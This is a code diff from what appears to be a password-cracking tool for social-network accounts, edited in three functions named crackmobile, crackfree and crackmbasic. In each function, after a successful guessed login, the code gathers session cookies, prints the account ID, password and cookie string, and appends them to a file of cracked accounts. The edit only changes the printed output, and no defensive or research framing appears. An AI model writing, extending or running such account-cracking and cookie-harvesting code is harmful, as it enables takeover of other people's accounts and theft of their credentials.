@@ -261,7 +261,7 @@ def crackmobile(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r└── {hijo}{idf}|{pw}\n{xxx}└── {hijo}{kuki}{xxx}')
+				print(f'\r└── {hijo}{idf}|{pw}|{kuki}\n{xxx}└──{hijo} {ua}{xxx}')
 				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
@@ -296,7 +296,7 @@ def crackfree(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r└── {hijo}{idf}|{pw}\n{xxx}└── {hijo}{kuki}{xxx}')
+				print(f'\r└── {hijo}{idf}|{pw}|{kuki}\n{xxx}└──{hijo} {ua}{xxx}')
 				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
@@ -331,7 +331,7 @@ def crackmbasic(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r└── {hijo}{idf}|{pw}\n{xxx}└── {hijo}{kuki}{xxx}')
+				print(f'\r└── {hijo}{idf}|{pw}|{kuki}\n{xxx}└──{hijo} {ua}{xxx}')
 				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
